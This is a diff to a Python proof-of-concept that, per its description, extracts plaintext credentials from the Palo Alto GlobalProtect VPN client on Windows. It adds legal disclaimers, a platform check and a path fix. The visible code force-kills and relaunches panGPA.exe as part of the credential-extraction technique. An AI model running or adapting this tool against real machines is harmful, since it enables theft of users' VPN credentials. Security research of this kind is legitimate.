@@ -1,5 +1,19 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
+
+# =============================================================================
+# AVISO LEGAL / LEGAL NOTICE
+# -----------------------------------------------------------------------------
+# Esta herramienta es unicamente para fines educativos y de auditoria de
+# seguridad autorizada. El uso no autorizado contra sistemas sin el
+# consentimiento explicito del propietario es ilegal.
+# El usuario asume toda responsabilidad por el uso indebido.
+#
+# This tool is for educational and authorized security auditing purposes only.
+# Unauthorized use against systems without the owner's explicit consent is
+# illegal. The user assumes all responsibility for misuse.
+# =============================================================================
+
 # autor @apuromafo
 
 description = 'conversión de un C en python [poc de https://shells.systems/extracting-plaintext-credentials-from-palo-alto-global-protect/ ]'
@@ -7,12 +21,15 @@ author = 'Apuromafo'
 version = '0.0.1'
 date = '28.11.2024'
 
+import sys
+if sys.platform != "win32":
+    sys.exit("[!] Este script es solo para Windows / This script is Windows-only")
+
+import os
 import ctypes
 import ctypes.wintypes
-import sys
 import time # sleep banner
 import re
-import sys
 import random
 
 def print_banner():
@@ -142,7 +159,8 @@ def pretty_print_xml(buffer):
 
 # Función principal
 def main():
-    process_path = r"C:\Program Files\Palo Alto Networks\GlobalProtect\panGPA.exe"
+    pf_path = os.environ.get('PROGRAMFILES', r'C:\Program Files')
+    process_path = os.path.join(pf_path, r'Palo Alto Networks\GlobalProtect\panGPA.exe')
     ctypes.windll.kernel32.WinExec(f'taskkill /IM PanGPA.exe /F', 0)
     
     si = STARTUPINFO()
@@ -179,6 +197,8 @@ def main():
     ctypes.windll.kernel32.CloseHandle(pi.hThread)
     ctypes.windll.kernel32.CloseHandle(pi.hProcess)
 
+
+print("\n[!] AVISO LEGAL: Use solo con autorizacion. / LEGAL NOTICE: Authorized use only.\n")
 if __name__ == "__main__":
     print_banner()
     main()
